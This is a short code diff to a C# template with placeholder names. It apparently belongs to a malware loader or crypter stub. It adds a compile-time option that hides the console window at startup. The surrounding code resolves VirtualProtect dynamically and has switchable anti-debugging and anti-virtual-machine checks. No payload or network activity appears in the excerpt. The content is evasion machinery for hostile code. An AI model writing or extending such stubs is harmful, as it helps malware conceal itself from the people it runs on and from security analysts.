@@ -21,6 +21,14 @@ namespace namespace_name
         [DllImport("kernel32.dll")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+#if HIDE_CONSOLE
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+#endif
+
         delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 #if ANTI_DEBUG
         delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
@@ -29,6 +37,9 @@ namespace namespace_name
 
         static void Main(string[] args)
         {
+#if HIDE_CONSOLE
+            ShowWindow(GetConsoleWindow(), 0);
+#endif
 #if ANTI_VM
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
             ManagementObjectCollection instances = searcher.Get();
